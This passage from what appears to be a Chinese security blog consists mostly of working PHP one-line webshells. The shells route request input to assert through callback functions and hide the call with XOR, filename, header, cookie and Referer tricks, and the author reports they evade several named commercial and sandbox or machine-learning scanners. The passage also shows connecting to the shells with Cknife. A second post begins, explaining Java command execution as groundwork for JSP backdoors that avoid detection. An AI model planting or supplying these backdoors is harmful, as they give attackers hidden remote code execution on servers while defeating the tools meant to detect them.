<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">$ch = explode(<span class="string">"."</span>,<span class="string">"hello.ass.world.er.t"</span>);</span><br><span class="line">register_shutdown_function($ch[<span class="number">1</span>].$ch[<span class="number">3</span>].$ch[<span class="number">4</span>], $_REQUEST[$password]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetfq5utwj30lg060weo.jpg" alt="初步绕过被发现"></p>
<p>所以，有理由推测，有一个恶意函数库，凡是网络上披露过的可用作后门的回调函数，都可能在其中，而且很大概率上会被检测出来。</p>
<p>经过收集，发现网络上50多个<strong>已披露出来的</strong>可用作后门的回调函数和类中，有部分函数仍然可以用来绕过Webshell查杀软件。</p>
<h2 id="0x03：查找可做后门的回调函数"><a href="#0x03：查找可做后门的回调函数" class="headerlink" title="0x03：查找可做后门的回调函数"></a>0x03：查找可做后门的回调函数</h2><p>去<a href="http://php.net/manual/zh/" target="_blank" rel="noopener">PHP官网</a>查阅函数手册，查找可以用作后门的PHP回调函数，根据实际经验，利用下面五个关键词，能提高查找到拥有后门潜质的PHP回调函数的效率：</p>
<h5 id="关键词一：callable"><a href="#关键词一：callable" class="headerlink" title="关键词一：callable"></a>关键词一：callable</h5><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetfsg9sgj30lf058mxh.jpg" alt="关键词1"></p>
<h5 id="关键词二：mixed-options"><a href="#关键词二：mixed-options" class="headerlink" title="关键词二：mixed $options"></a>关键词二：mixed $options</h5><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetfuwbvej30mf0de400.jpg" alt="关键词2"></p>
<h5 id="关键词三：handler"><a href="#关键词三：handler" class="headerlink" title="关键词三：handler"></a>关键词三：handler</h5><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetfxjytej30nk08rgma.jpg" alt="关键词3"></p>
<h5 id="关键词四：callback"><a href="#关键词四：callback" class="headerlink" title="关键词四：callback"></a>关键词四：callback</h5><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetg01tikj30n708pt9c.jpg" alt="关键词4"></p>
<h5 id="关键词五：invoke"><a href="#关键词五：invoke" class="headerlink" title="关键词五：invoke"></a>关键词五：invoke</h5><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetg2q9qkj30jh08waag.jpg" alt="关键词5"></p>
<p>除此之外，<strong>PHP扩展</strong>中也有些合适的回调函数，不过可能通用性不强，本文不做讨论。</p>
<h2 id="0x04：绕过传统检测"><a href="#0x04：绕过传统检测" class="headerlink" title="0x04：绕过传统检测"></a>0x04：绕过传统检测</h2><p>先拿披露过的array_udiff_assoc()函数构造一个免杀一句话。</p>
<p>函数定义：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span> array_udiff_assoc ( <span class="keyword">array</span> $array1 , <span class="keyword">array</span> $array2 [, <span class="keyword">array</span> $... ], callable $value_compare_func )</span><br></pre></td></tr></table></figure>

<p>根据定义，可以构造代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">array_udiff_assoc(<span class="keyword">array</span>(<span class="string">"phpinfo();"</span>), <span class="keyword">array</span>(<span class="number">1</span>), <span class="string">"assert"</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetg635xjj30ng0c8acz.jpg" alt="执行成功">)继续构造适合客户端连接的一句话木马脚本<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/php/array_udiff_assoc.php" target="_blank" rel="noopener">array_udiff_assoc.php</a>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Noticed: (PHP 5 &gt;= 5.4.0, PHP 7)</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">array_udiff_assoc(<span class="keyword">array</span>($_REQUEST[$password]), <span class="keyword">array</span>(<span class="number">1</span>), <span class="string">"assert"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>浏览器访问</p>
<p><code>http://127.0.0.1/shell/test/test.php?LandGrey=phpinfo();</code></p>
<p>Cknife添加目标<code>http://127.0.0.1/shell/test/test.php</code>  密码: LandGrey，可成功连接。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetg9dxvbj30gw067aag.jpg" alt="Cknife连接"></p>
<p>用查杀工具检测：只有故意放置的一个eval一句话被查出来。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetgd2xa2j30kf0ekwhu.jpg" alt="查杀工具测试"></p>
<p>bugscaner 在线查杀，通过</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetggdmjxj30mi06eaae.jpg" alt="bugscanner在线查杀"></p>
<p>使用河马正式版在线查杀，通过</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetgm7eqhj30qy0c8abe.jpg" alt="河马正式版在线查杀"></p>
<p>至此，我们<strong>已经绕过安全狗、D盾和深信服的客户端Webshell查杀和bugscaner、河马正式版的在线查杀</strong>。</p>
<p>可以发现，只需找一个网络上没有”<strong>频繁出现</strong>“或”<strong>没有出现过</strong>“回调函数，<strong>稍加变形</strong>，即可绕过传统技术的检测。</p>
<p>再给一个”array_intersect_ukey”反调函数的免杀示例<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/php/array_intersect_ukey.php" target="_blank" rel="noopener">array_intersect_ukey.php</a>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Noticed: (PHP 5 &gt;= 5.4.0, PHP 7)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">$ch = explode(<span class="string">"."</span>,<span class="string">"hello.ass.world.er.t"</span>);</span><br><span class="line">array_intersect_ukey(<span class="keyword">array</span>($_REQUEST[$password] =&gt; <span class="number">1</span>), <span class="keyword">array</span>(<span class="number">1</span>), $ch[<span class="number">1</span>].$ch[<span class="number">3</span>].$ch[<span class="number">4</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="0x05：突破OpenRASP-WebShell沙盒检测"><a href="#0x05：突破OpenRASP-WebShell沙盒检测" class="headerlink" title="0x05：突破OpenRASP WebShell沙盒检测"></a>0x05：突破<strong>OpenRASP</strong> WebShell沙盒检测</h2><p>接着用OpenRASP团队的WEBDIR+在线查杀平台，被查出来是后门</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetgp7sy4j30ur07y3yy.jpg" alt="OpenRASP在线查杀"></p>
<p>经过反复测试和观察，OpenRASP 团队的Webshell检测使用了动态监测技术，原理上应该是<strong>将脚本放在安全沙盒中执行，分析脚本行为、尝试触发脚本的后门动作等</strong>。不管混淆的脚本多厉害，使用了多巧妙的函数，试执行时基本都会被检测出来。</p>
<p>刚开始时，发现使用<strong>PHP脚本加密技术</strong>，可以有效绕过OpenRASP团队的WEBDIR+ Webshell检测服务。但加密动作太大，会被D盾或深信服的Webshell查杀软件警告，不仅不能实现零警告和无提示，人眼一看就会发现有问题，所以放弃了加密脚本这条路。</p>
<p>然后就陷入了一段时间的思索，这里给出一种基于免杀的回调函数，<strong>利用信息不对称</strong>来绕过OpenRASP  WEBDIR+平台检测的技术：</p>
<ol>
<li><h4 id="利用重命名前后的脚本名不同"><a href="#利用重命名前后的脚本名不同" class="headerlink" title="利用重命名前后的脚本名不同"></a>利用重命名前后的脚本名不同</h4></li>
</ol>
<p>在检测几次后，观察发现WEBDIR+ 把上传文件都按照文件哈希值重名了</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetgslq64j306l01ggli.jpg" alt="OpenRASP在线查杀"></p>
<p>所示，猜测该平台是先将上传脚本重命名，然后再在沙盒中试执行检测Webshell。那么就可以利用一句话脚本文件名在重命名前后的差别，完成绕过。一段核心的绕过检测的木马代码<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/array_intersect_uassoc-file-last-char-must-be-s.php" target="_blank" rel="noopener">array_intersect_uassoc-s.php</a>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">$&#123;<span class="string">"LandGrey"</span>&#125; = substr(<span class="keyword">__FILE__</span>,<span class="number">-5</span>,<span class="number">-4</span>) . <span class="string">"class"</span>;</span><br><span class="line">$f = $LandGrey ^ hex2bin(<span class="string">"12101f040107"</span>);</span><br><span class="line">array_intersect_uassoc (<span class="keyword">array</span>($_REQUEST[$password] =&gt; <span class="string">""</span>), <span class="keyword">array</span>(<span class="number">1</span>), $f);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>脚本名必须是”***s.php”的名字形式，即最后一位字符要为”s”，然后用”sclass” 和 hex2bin(“12101f040107”)的值按位异或，得到”assert”，从而利用回调函数，执行PHP代码。</p>
<p>上传到WEBDIR+系统后，脚本被重命名，”<strong>试执行时自然无法复现木马行为</strong>“，从而绕过了检测。这种方式有一种明显的要求，就是我们能够准确预知或控制脚本名的最后一位字符。</p>
<p>如果写成通用型脚本，根据文件名的最后一位字符，自动选择做异或的字符串，得到”assert”，代码示例如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">$key = substr(<span class="keyword">__FILE__</span>,<span class="number">-5</span>,<span class="number">-4</span>);</span><br><span class="line">$&#123;<span class="string">"LandGrey"</span>&#125; =  $key.<span class="string">"Land!"</span>;</span><br><span class="line">$trick = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"0"</span> =&gt; <span class="string">"51"</span>, <span class="string">"1"</span> =&gt; <span class="string">"50"</span>, <span class="string">"2"</span> =&gt; <span class="string">"53"</span>, <span class="string">"3"</span> =&gt; <span class="string">"52"</span>, <span class="string">"4"</span> =&gt; <span class="string">"55"</span>, <span class="string">"5"</span> =&gt; <span class="string">"54"</span>, <span class="string">"6"</span> =&gt; <span class="string">"57"</span>, <span class="string">"7"</span> =&gt; <span class="string">"56"</span>, <span class="string">"8"</span> =&gt; <span class="string">"59"</span>,</span><br><span class="line">    <span class="string">"9"</span> =&gt; <span class="string">"58"</span>, <span class="string">"a"</span> =&gt; <span class="string">"00"</span>, <span class="string">"b"</span> =&gt; <span class="string">"03"</span>, <span class="string">"c"</span> =&gt; <span class="string">"02"</span>, <span class="string">"d"</span> =&gt; <span class="string">"05"</span>, <span class="string">"e"</span> =&gt; <span class="string">"04"</span>, <span class="string">"f"</span> =&gt; <span class="string">"07"</span>, <span class="string">"g"</span> =&gt; <span class="string">"06"</span>, <span class="string">"h"</span> =&gt; <span class="string">"09"</span>,</span><br><span class="line">    <span class="string">"i"</span> =&gt; <span class="string">"08"</span>, <span class="string">"j"</span> =&gt; <span class="string">"0b"</span>, <span class="string">"k"</span> =&gt; <span class="string">"0a"</span>, <span class="string">"l"</span> =&gt; <span class="string">"0d"</span>, <span class="string">"m"</span> =&gt; <span class="string">"0c"</span>, <span class="string">"n"</span> =&gt; <span class="string">"0f"</span>, <span class="string">"o"</span> =&gt; <span class="string">"0e"</span>, <span class="string">"p"</span> =&gt; <span class="string">"11"</span>, <span class="string">"q"</span> =&gt; <span class="string">"10"</span>,</span><br><span class="line">    <span class="string">"r"</span> =&gt; <span class="string">"13"</span>, <span class="string">"s"</span> =&gt; <span class="string">"12"</span>, <span class="string">"t"</span> =&gt; <span class="string">"15"</span>, <span class="string">"u"</span> =&gt; <span class="string">"14"</span>, <span class="string">"v"</span> =&gt; <span class="string">"17"</span>, <span class="string">"w"</span> =&gt; <span class="string">"16"</span>, <span class="string">"x"</span> =&gt; <span class="string">"19"</span>, <span class="string">"y"</span> =&gt; <span class="string">"18"</span>, <span class="string">"z"</span> =&gt; <span class="string">"1b"</span>,</span><br><span class="line">    <span class="string">"A"</span> =&gt; <span class="string">"20"</span>, <span class="string">"B"</span> =&gt; <span class="string">"23"</span>, <span class="string">"C"</span> =&gt; <span class="string">"22"</span>, <span class="string">"D"</span> =&gt; <span class="string">"25"</span>, <span class="string">"E"</span> =&gt; <span class="string">"24"</span>, <span class="string">"F"</span> =&gt; <span class="string">"27"</span>, <span class="string">"G"</span> =&gt; <span class="string">"26"</span>, <span class="string">"H"</span> =&gt; <span class="string">"29"</span>, <span class="string">"I"</span> =&gt; <span class="string">"28"</span>,</span><br><span class="line">    <span class="string">"J"</span> =&gt; <span class="string">"2b"</span>, <span class="string">"K"</span> =&gt; <span class="string">"2a"</span>, <span class="string">"L"</span> =&gt; <span class="string">"2d"</span>, <span class="string">"M"</span> =&gt; <span class="string">"2c"</span>, <span class="string">"N"</span> =&gt; <span class="string">"2f"</span>, <span class="string">"O"</span> =&gt; <span class="string">"2e"</span>, <span class="string">"P"</span> =&gt; <span class="string">"31"</span>, <span class="string">"Q"</span> =&gt; <span class="string">"30"</span>, <span class="string">"R"</span> =&gt; <span class="string">"33"</span>,</span><br><span class="line">    <span class="string">"S"</span> =&gt; <span class="string">"32"</span>, <span class="string">"T"</span> =&gt; <span class="string">"35"</span>, <span class="string">"U"</span> =&gt; <span class="string">"34"</span>, <span class="string">"V"</span> =&gt; <span class="string">"37"</span>, <span class="string">"W"</span> =&gt; <span class="string">"36"</span>, <span class="string">"X"</span> =&gt; <span class="string">"39"</span>, <span class="string">"Y"</span> =&gt; <span class="string">"38"</span>, <span class="string">"Z"</span> =&gt; <span class="string">"3b"</span>,</span><br><span class="line">);</span><br><span class="line">$f = pack(<span class="string">"H*"</span>, $trick[$key].<span class="string">"3f120b1655"</span>) ^ $key.<span class="string">"Land!"</span>;</span><br><span class="line">array_intersect_uassoc (<span class="keyword">array</span>($_REQUEST[$password] =&gt; <span class="string">""</span>), <span class="keyword">array</span>(<span class="number">1</span>), $f);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>就如下图所示，会被查杀：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetgvrri0j30qk04tq35.jpg" alt="OpenRASP在线查杀"></p>
<p>将脚本命名为<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/php/array_intersect_uassoc-filename-last-char-must-be-r.php" target="_blank" rel="noopener">array_intersect_uassoc-r.php</a>, 硬编码脚本最后一位字符为”r”，就不会被平台检测到，证明了我们原始的想法和对平台检测原理的部分推测:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">$key = substr(<span class="keyword">__FILE__</span>,<span class="number">-5</span>,<span class="number">-4</span>);</span><br><span class="line">$&#123;<span class="string">"LandGrey"</span>&#125; =  $key.<span class="string">"Land!"</span>;</span><br><span class="line">$f = pack(<span class="string">"H*"</span>, <span class="string">"13"</span>.<span class="string">"3f120b1655"</span>) ^ $LandGrey;</span><br><span class="line">array_intersect_uassoc (<span class="keyword">array</span>($_REQUEST[$password] =&gt; <span class="string">""</span>), <span class="keyword">array</span>(<span class="number">1</span>), $f);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li><h4 id="利用检测平台的信息缺失"><a href="#利用检测平台的信息缺失" class="headerlink" title="利用检测平台的信息缺失"></a>利用检测平台的信息缺失</h4></li>
</ol>
<p>接着猜想：当脚本在沙盒中运行时，如果得不到可以让脚本正常执行的关键信息，平台就无法查杀Webshell；而我们连接时，带上关键信息，就可以正常使用一句话木马后门，从而绕过查杀。</p>
<p>例如，利用下面的一句话<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/php/array_intersect_uassoc-headers-accept-r.php" target="_blank" rel="noopener">array_intersect_uassoc-headers-accept-r.php</a>，请求时，Cknife携带请求头<code>Accept: r</code>，密码输入”LandGrey”，即可成功连接一句话木马：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetgzz8o8j30cf06edfs.jpg" alt="Cknife"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">$key = substr(<span class="keyword">__FILE__</span>,<span class="number">-5</span>,<span class="number">-4</span>);</span><br><span class="line">$&#123;<span class="string">"LandGrey"</span>&#125; = $_SERVER[<span class="string">"HTTP_ACCEPT"</span>].<span class="string">"Land!"</span>;</span><br><span class="line">$f = pack(<span class="string">"H*"</span>, <span class="string">"13"</span>.<span class="string">"3f120b1655"</span>) ^ $LandGrey;</span><br><span class="line">array_intersect_uassoc(<span class="keyword">array</span>($_REQUEST[$password] =&gt; <span class="string">""</span>), <span class="keyword">array</span>(<span class="number">1</span>), $f);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gheth2gz8ij30kl04t74f.jpg" alt="OpenRASP在线查杀"></p>
<ol start="3">
<li><h4 id="其它信息的差异"><a href="#其它信息的差异" class="headerlink" title="其它信息的差异"></a>其它信息的差异</h4></li>
</ol>
<p>在针对某个特别的目标测试时，可以利用目标的特殊信息构造信息的差异，实现Webshell绕过。</p>
<p>如目标IP地址的唯一性、域名、特殊Cookie、Session字段和值、$_SERVER变量中可被控制的值，甚至是主机Web服务的根目录、操作系统等一些差别，发挥空间很大。</p>
<h2 id="0x06：绕过深度学习技术的检测"><a href="#0x06：绕过深度学习技术的检测" class="headerlink" title="0x06：绕过深度学习技术的检测"></a>0x06：绕过深度学习技术的检测</h2><p>当用0x05 “<strong>1. 利用重命名前后的脚本名不同</strong>“中的脚本来测试时，被深度学习模型技术检测Webshell给查杀了。</p>
<p>但是基于免杀的回调函数，利用0x05给出的”<strong>2. 利用检测平台的信息缺失</strong>“给出的一句话，仍然可以突破 webshell.cdxy.me平台的Webshell检测:</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gheth58rl6j30m80cswf5.jpg" alt="OpenRASP在线查杀"></p>
<p>为了避免偶然，换个免杀函数，再测试一次。请求时设置Cookie值为<code>Cookie: set-domain-name=ass;</code>，以下示例脚本<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/php/array_intersect_ukey-cookie-ass.php" target="_blank" rel="noopener">array_intersect_ukey-cookie-ass.php</a>代码也可绕过该平台的查杀，当然，以上提到的其它工具和平台也可以绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Noticed: (PHP 5 &gt;= 5.4.0, PHP 7)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">$ch = $_COOKIE[<span class="string">"set-domain-name"</span>];</span><br><span class="line">array_intersect_ukey(<span class="keyword">array</span>($_REQUEST[$password] =&gt; <span class="number">1</span>), <span class="keyword">array</span>(<span class="number">1</span>), $ch.<span class="string">"ert"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h2><p>在测试期间，还对河马机器学习查杀引擎  <a href="http://ml.shellpub.com" target="_blank" rel="noopener">http://ml.shellpub.com</a> 进行过测试，发现突破不了。测试中，发现连下面的正常语句都会被杀：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>所以就将Wordpress的源码上传，测试下系统的可用性。1774个文件，发现了1494个疑似后门。系统的测试结果不能作为判断标准，所以正文中略过了对该平台的测试。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gheth8vpnhj30rd0fsaaw.jpg" alt="机器学习在线查杀"></p>
<h2 id="0x07-彩蛋"><a href="#0x07-彩蛋" class="headerlink" title="0x07: 彩蛋"></a>0x07: 彩蛋</h2><p>最后再给出一个可以绕过当前市面上几乎所有Webshell查杀的PHP一句话木马脚本<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/php/forward_static_call_array-referer-ass.php" target="_blank" rel="noopener">forward_static_call_array-referer-ass.php</a>。请求时，设置Referer头，后面以”ass****”结尾即可,比如：<code>Referer: http://www.target.com/ass.php</code>。</p>
<p>在使用Cknife时，注意软件实现有缺陷，会从第二个”:”处截断，可改成<code>Referer: http%3a//www.target.com/ass.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Noticed: (PHP 5 &gt;= 5.3.0, PHP 7)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$password = <span class="string">"LandGrey"</span>;</span><br><span class="line">$wx = substr($_SERVER[<span class="string">"HTTP_REFERER"</span>],<span class="number">-7</span>,<span class="number">-4</span>);</span><br><span class="line">forward_static_call_array($wx.<span class="string">"ert"</span>, <span class="keyword">array</span>($_REQUEST[$password]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="0x08-后记"><a href="#0x08-后记" class="headerlink" title="0x08: 后记"></a>0x08: 后记</h2><p>文章的”<strong>0x04: 绕过传统检测</strong>“研究结果表明：对于基于<strong>陌生的回调函数后门</strong>构造的一句话后门<strong>脚本本身</strong>，传统的基于特征、正则表达式和黑名单制的查杀技术，已经失去了对抗PHP Webshell检测的意义。</p>
<p>“<strong>0x05: 突破OpenRASP WebShell沙盒检测</strong>“、”<strong>0x06: 绕过深度学习技术的检测</strong>“和”<strong>小插曲</strong>“部分的研究结果表名：新型的沙盒技术、深度学习、机器学习查杀平台还不够成熟和稳定，虽然在<strong>检测未知的一句话木马方面表现领先于传统检测方式</strong>，但是经过研究，还是可以构造出绕过查杀的PHP一句话木马脚本。</p>
<p>文章以上研究都是对PHP一句话<strong>木马脚本本身</strong>的免杀研究。文章发布后，以上多个回调函数后门估计很快会被加入黑名单。</p>
<p>要注意对于实际应用中，脚本本身免杀只是第一步，WAF和查杀软件可能会根据脚本的创建日期、文件大小、通信流量特征等多个方面，动态、综合的判断脚本是否为恶意Webshell，本文并未涉及。</p>
<h2 id="0x09-参考文档"><a href="#0x09-参考文档" class="headerlink" title="0x09: 参考文档"></a>0x09: 参考文档</h2><p><a href="http://php.net/manual" target="_blank" rel="noopener">http://php.net/manual</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</a></p>
<p><a href="https://joychou.org/web/webshell.html" target="_blank" rel="noopener">https://joychou.org/web/webshell.html</a></p>
<p><a href="http://www.likesec.com/2017/12/08/webshell/" target="_blank" rel="noopener">http://www.likesec.com/2017/12/08/webshell/</a></p>
<p><a href="http://blog.safedog.cn/?p=68" target="_blank" rel="noopener">http://blog.safedog.cn/?p=68</a></p>
<p><a href="http://www.freebuf.com/articles/web/155891.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/155891.html</a></p>
<p><a href="http://www.freebuf.com/articles/web/9396.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/9396.html</a></p>
<p><a href="https://blog.csdn.net/xysoul/article/details/49791993" target="_blank" rel="noopener">https://blog.csdn.net/xysoul/article/details/49791993</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1097506" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1097506</a></p>
<p><a href="http://www.91ri.org/12824.html" target="_blank" rel="noopener">http://www.91ri.org/12824.html</a></p>
<p><a href="http://www.3years.cc/index.php/archives/18/" target="_blank" rel="noopener">http://www.3years.cc/index.php/archives/18/</a></p>
<p><a href="http://www.cnblogs.com/LittleHann/p/3522990.html" target="_blank" rel="noopener">http://www.cnblogs.com/LittleHann/p/3522990.html</a></p>
<p><a href="https://habrahabr.ru/post/215139/" target="_blank" rel="noopener">https://habrahabr.ru/post/215139/</a></p>
<p><a href="https://stackoverflow.com/questions/14674834/php-convert-string-to-hex-and-hex-to-string" target="_blank" rel="noopener">https://stackoverflow.com/questions/14674834/php-convert-string-to-hex-and-hex-to-string</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
  </entry>
  <entry>
    <title>java执行系统命令</title>
    <url>/2020/08/04/java-using/</url>
    <content><![CDATA[<h3 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h3><p>  JSP后门，一般是指文件名以.jsp等后缀结尾的，可运行于Java servlet及相关容器和组件内的通用JSP脚本。</p>
<p>  本文主要讨论利用Java反射机制和Java类加载机制构造JSP系统命令执行后门，并绕过一般软件检测的方法。</p>
<h3 id="0x01：Java执行系统命令的方法和原理"><a href="#0x01：Java执行系统命令的方法和原理" class="headerlink" title="0x01：Java执行系统命令的方法和原理"></a>0x01：Java执行系统命令的方法和原理</h3><p>  要构建JSP命令执行后门，首先需要了解Java语言执行系统命令的方法及其原理。通过查阅资料知道：目前Java语言执行系统命令主要通过下面两个类的相关方法实现：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.lang.Runtime</span><br><span class="line">java.lang.ProcessBuilder</span><br></pre></td></tr></table></figure>

<ul>
<li><h4 id="JVM层面"><a href="#JVM层面" class="headerlink" title="JVM层面"></a>JVM层面</h4></li>
</ul>
<p>查阅 <a href="http://tool.oschina.net/apidocs/apidoc?api=jdk-zh" target="_blank" rel="noopener"><strong>Java 文档</strong></a> 可以发现，上面两个类，都是对java.lang.Process抽象类的实现</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetizut1tj30q30bagmr.jpg" alt="java.lang.Process类"></p>
<p>Java语言中执行系统命令的方式，简单来说就是<strong>由JVM创建一个本机进程，加载对应的指令到进程的地址空间中，然后执行该指令</strong>。</p>
<p>而<strong>java.lang.Runtime.getRuntime().exec()</strong>和 <strong>java.lang.ProcessBuilder.start()</strong>方法，其实就是创建一个进程的方法。</p>
<ul>
<li><h4 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h4><p>首先，进入java.lang.Runtime类中，发现Runtime类的构造器是private修饰的，所以无法直接获得Runtime类的实例，只能通过其getRuntime()方法来间接获取一个Runtime类的实例。</p>
</li>
</ul>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetj1maj3j30fl094dgc.jpg" alt="Runtime的private构造方法"></p>
<p>  跟随java.lang.Runtime.getRuntime()，进入exec()方法；然后不断跟踪代码，定位到如下方法中。可以看到，Runtime类实现的系统命令执行方法exec()，底层代码其实是调用了ProcessBuilder类。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetj3vvogj30dx05874e.jpg" alt="Runtime.exec()方法"></p>
<p>  然后我们定位到ProcessBuilder类代码中，我们知道ProcessBuilder类用start方法创建进程，所以找到start方法的相关代码。可以发现其底层代码是调用了java.lang.ProcessImpl类的start方法，最终实现创建本机进程，执行系统命令的功能。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetj5u8b3j30e40h13zp.jpg" alt="ProcessBuilder.start()方法"></p>
<p>  继续跟踪，发现ProcessImpl类的原型是一个继承自Process类的final类</p>
<p><code>final class ProcessImpl extends Process{}</code></p>
<p>  查看ProcessImpl的构造器，发现是private修饰的，所以无法直接在java.lang包外，直接调用ProcessImpl类。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private ProcessImpl(String cmd[],</span><br><span class="line">                    final String envblock,</span><br><span class="line">                    final String path,</span><br><span class="line">                    final long[] stdHandles,</span><br><span class="line">                    final boolean redirectErrorStream)</span><br><span class="line">    throws IOException</span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>继续追踪ProcessImpl类的start方法，发现最后是返回了一个ProcessImpl 类的实例。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetj81vrbj30h70ewwfn.jpg" alt="ProcessImpl.start()方法"></p>
<p>总结一下，Java语言执行系统命令相关类和方法的调用关系表示如下图：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetjae4w5j30ac092weq.jpg" alt="依存关系"></p>
<h3 id="0x02：JSP标签"><a href="#0x02：JSP标签" class="headerlink" title="0x02：JSP标签"></a>0x02：JSP标签</h3><p> 在JSP页面中嵌入java代码，需要正确的使用JSP标签，这里顺带提一下。</p>
